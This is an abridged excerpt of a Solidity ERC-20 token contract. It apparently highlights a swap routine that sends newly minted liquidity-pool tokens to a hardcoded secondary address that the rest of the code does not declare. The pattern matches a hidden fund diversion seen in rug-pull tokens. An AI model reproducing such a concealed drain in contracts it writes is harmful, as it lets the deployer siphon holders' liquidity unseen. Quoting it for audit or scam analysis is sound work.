...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 fundAmount = UsdtBalance .mul(2).div(7);
        address secFundAddress = 0xba7625FF72Ca77c77f9271857dBa4092D809a71b;
        ...
        if (lpAmount > 0) {
            ...
            if (lpUsdt > 0) {
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpUsdt, 0, 0, secFundAddress, block.timestamp
                );
            }
        }
    }
...
contract JBP is AbsToken {
    constructor() AbsToken(
        ...
        address(0xFED9D7B2b58677bB076e9DF7bb1D17034a715375),
    
        address(0x76C6b3c41bD357A0A933458aF7b0838B7D67879E)
    ){
